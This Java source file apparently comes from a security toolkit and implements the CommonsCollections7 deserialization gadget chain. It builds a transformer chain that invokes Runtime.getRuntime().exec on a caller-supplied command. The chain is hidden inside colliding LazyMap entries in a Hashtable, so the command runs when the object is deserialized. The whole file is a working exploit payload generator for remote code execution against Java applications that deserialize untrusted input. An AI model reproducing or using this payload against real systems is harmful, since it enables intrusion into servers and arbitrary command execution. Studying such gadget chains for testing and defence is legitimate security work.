package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7 implements ObjectPayload {

    @Override
    public Object getObject(String command) throws Exception {

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{command}),
                new ConstantTransformer(1)
        };

        final Transformer transformerChain = new ChainedTransformer(new Transformer[0]);

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();


        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);


        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 1);

        lazyMap2.remove("yy");
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return hashtable;
    }
}